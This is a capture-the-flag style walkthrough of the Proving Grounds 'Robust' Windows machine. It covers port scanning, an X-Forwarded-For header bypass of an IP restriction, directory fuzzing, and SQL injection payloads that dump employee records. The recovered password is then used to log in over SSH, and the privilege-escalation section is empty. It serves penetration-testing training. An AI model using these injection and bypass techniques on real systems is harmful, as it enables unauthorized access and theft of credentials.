---
title: Proving Grounds - Robust
date: 2022-10-29 21:00:00 -500 
categories: [Proving Grounds]
tags: [oscp,windows]
---

# Robust Overview

## Machine Details

|IP|Hostname|Operating System|
|---|---|---|
|192.168.156.200|Robust|Windows|

## Path to Exploitation


# Enumeration

## Full Port Scan

```shell
$ nmap 192.168.156.200 -p- -oA Robust/nmap/full-port --open -Pn -vv
```

Which Resulted In:

|PORT|SERVICE|
|----|-------|
|22|ssh|
|80|http|
|7680|pando-pub|

## Service Scan

```shell
$ nmap 192.168.156.200 -p 22,80,7680 -sC -sV -oA Robust/nmap/service-scan -Pn
```

Which Resulting In:

|PORT|SERVICE|VERSION|
|----|-------|-------|
|22|ssh|for_Windows_8.1 (protocol 2.0)|
|80|http|cli server 5.5 or later (PHP 7.3.33)|
|7680|pando-pub?||


# Web Application Enumeration

When we navigate the the site, we see that we're redirected to a login.php page and that there's an IP restriction on the site. The page will only load if the request comes from a 10.10.10.x IP address.

![Landing Page](/assets/ProvingGrounds/Robust/landing-page.png)

We can bypass this check, by adding the X-Forwarded-For header to our request

![Bypass IP Restriction](/assets/ProvingGrounds/Robust/ip-bypass.png)

Now we are able to view the login page

![Login Page](/assets/ProvingGrounds/Robust/login-page.png)

Now that we're able to view the site, we can bruteforce directories and see if there are any other pages of interest.

```shell
$ wfuzz -H "X-Forwarded-For: 10.10.10.10" --sc 302 -u http://192.168.156.200/FUZZ.php -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

And we find the following pages:
- home.php
- index.php

![Identified Pages](/assets/ProvingGrounds/Robust/identified-pages.png)

Before we're able to navigate to any other pages, we notice that there's a header in the server response that keeps redirecting us to login.php

![Login Redirect](/assets/ProvingGrounds/Robust/login-redirect.png)

We can use the "match & Replace" feature in Burp to get around this.

![Match & Replace](/assets/ProvingGrounds/Robust/match-replace.png)

Now when we navigate to the home.php page, we see an employee management page.

![Employee Management Page](/assets/ProvingGrounds/Robust/employee-page.png)

We identify that the page is vulnerable to SQL injection by passing the following payload in the "First Name" field:

```shell
' or 1=1;
```

![Test Injection](/assets/ProvingGrounds/Robust/test-injection.png)

We can try to query the database for all employees in the system

```shell
' Union select * from employees;
```
![SQL Injection](/assets/ProvingGrounds/Robust/sql-injection.png)

We see that the Jeff user has what appears to be their password set for their date of birth

# Shell on Robust

We can use the identified credentials to login as Jeff via SSH

![SSH as Jeff](/assets/ProvingGrounds/Robust/jeff-ssh.png)

# Local Enumeration

# Privilege Escalation
